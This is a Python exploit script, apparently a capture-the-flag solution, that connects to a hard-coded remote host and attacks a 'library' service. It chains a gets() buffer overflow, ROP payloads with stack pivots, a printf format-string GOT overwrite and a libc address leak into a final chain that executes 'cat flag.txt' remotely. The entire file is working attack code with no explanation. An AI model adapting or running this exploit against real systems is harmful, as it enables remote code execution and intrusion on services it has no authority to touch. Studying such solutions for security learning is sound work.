#!/usr/bin/env python3
import socket

from exploit import (BASE, CMD, GETS_GOT, GOT_FRAME, HIGH, HIGH1, HIGH2,
                     HIGH3, HIGH4, LEAVE_RET, LOW_FRAME, P, PRINTF_PLT,
                     READ_AGAIN, U, pad)

HOST, PORT = '104.154.133.139', 1337
GREETING = b'Welcome to the library, Dear reader'


def recv_until(sock, marker):
    data = bytearray()
    while not data.endswith(marker):
        chunk = sock.recv(1)
        if not chunk:
            raise EOFError(f'connection closed after {bytes(data)!r}')
        data.extend(chunk)
    return bytes(data)


def send(sock, data):
    if b'\n' in data:
        raise ValueError('gets payload contains a newline byte; reconnect and retry')
    sock.sendall(data + b'\n')


def main():
    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        sock.settimeout(10)
        print('prompt:', repr(recv_until(sock, b'book: ')))

        send(sock, b'A' * 0x80 + P(HIGH1) + P(READ_AGAIN))
        recv_until(sock, GREETING)

        data = pad(b'H', 0x80) + P(LOW_FRAME) + P(READ_AGAIN)
        data = pad(data, 0x100) + P(GOT_FRAME) + P(READ_AGAIN)
        data = pad(data, 0x120) + P(LOW_FRAME) + P(READ_AGAIN)
        data += b''.join(P(0x404000 + i) for i in range(6))
        data += P(0x41) + P(GETS_GOT) + P(0x41) + P(LOW_FRAME + 1)
        data = pad(data, HIGH4 - HIGH) + P(HIGH1) + P(READ_AGAIN)
        data = pad(data, CMD - HIGH) + b'cat flag.txt\x00'
        send(sock, data)
        recv_until(sock, GREETING)

        fmt = b'%c' * 5 + b'%6s' * 6 + b'%45c%hhn%249c%hhn'
        data = pad(fmt, 0x40) + P(HIGH3) + P(LEAVE_RET)
        data = pad(data, 0x80) + P(HIGH2) + P(LEAVE_RET)
        send(sock, data)
        recv_until(sock, GREETING)

        send(sock, P(PRINTF_PLT))
        recv_until(sock, GREETING)  # greeting after the GOT overwrite
        leak_output = recv_until(sock, GREETING).removesuffix(GREETING)
        chunks = [leak_output[5 + i * 6:5 + (i + 1) * 6] for i in range(6)]
        if any(len(c) != 6 for c in chunks):
            raise ValueError(f'short libc leak: {leak_output!r}')
        raw = bytes((c.lstrip(b' ')[0] if c.lstrip(b' ') else 0) for c in chunks)
        leak = U(raw + b'\x00\x00')
        libc = leak - 0x8f740
        if libc & 0xfff:
            raise ValueError(f'bad libc leak: {leak:#x}')
        print(f'libc = {libc:#x}')

        data = pad(b'X', 0x80)
        data += P(0) + P(libc + 0x10f75c)
        data += P(libc + 0x10f75b) + P(CMD) + P(libc + 0x58740)
        data += P(libc + 0x10f75b) + P(0) + P(libc + 0x47b90)
        send(sock, data)
        output = bytearray()
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            output.extend(chunk)
        print(output.decode('utf-8', 'replace'))


if __name__ == '__main__':
    main()
